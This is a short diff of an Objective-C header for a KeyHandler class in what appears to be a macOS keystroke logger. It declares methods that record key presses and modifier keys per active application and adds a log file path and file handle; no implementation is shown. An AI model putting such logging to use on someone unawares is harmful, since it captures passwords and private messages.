@@ -10,19 +10,22 @@
 #import <AppKit/NSEvent.h>
 
 @interface KeyHandler : NSObject {
-    NSMutableString *logLine;
-    NSString *lastApp;
-    NSUInteger previousFlags;
+    NSUInteger _shortcutKeysState;
+    NSString* _currentApp;
+    NSString* _logPath;
+    NSFileHandle* _fileHandle;
 }
 
-@property (nonatomic, retain) NSMutableString *logLine;
-@property (nonatomic, retain) NSString *lastApp;
-
 - (void)logModifierKeys:(NSUInteger)modifierFlags;
+
 - (void)handleKeyPress:(NSEvent*)event;
-- (void)writeLine;
-- (void)appDidActivate:(NSNotification *)notification;
+
+- (void)logPress:(NSString*)keyTitle;
+
+- (void)appDidActivate:(NSNotification*)notification;
+
 - (NSString*)getAppName:(NSString*)appInfo;
+
 - (NSString*)keyCodeConversion:(unsigned short)keyCode;
 
 @end
